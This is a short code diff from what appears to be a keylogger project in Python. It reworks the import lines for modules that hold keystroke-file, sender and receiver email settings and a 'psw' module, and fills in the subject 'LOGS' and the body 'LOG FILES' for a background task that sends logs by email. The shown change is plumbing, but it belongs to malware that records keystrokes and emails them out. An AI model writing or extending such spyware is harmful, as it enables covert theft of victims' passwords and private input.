@@ -1,16 +1,24 @@
-from .email_sender import SendEmail
-from .config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
-from .utils import repeatedFunction
+try:
+    from .email_sender import SendEmail
+    from .config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
+    from .utils import repeatedFunction
+    if DEBUG:
+        from keylogger import psw
+except ImportError:
+    from email_sender import SendEmail
+    from config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
+    from utils import repeatedFunction
+    if DEBUG:
+        import psw
 import os
 import threading
-if DEBUG:
-    from keylogger import psw
+
 
 
 class BackgroundTask:
     def __init__(self):
-        self.EMAIL_SUBJECT = ""
-        self.EMAIL_BODY = ""
+        self.EMAIL_SUBJECT = "LOGS"
+        self.EMAIL_BODY = "LOG FILES"
     
     def send_logs(self):
         if DEBUG:
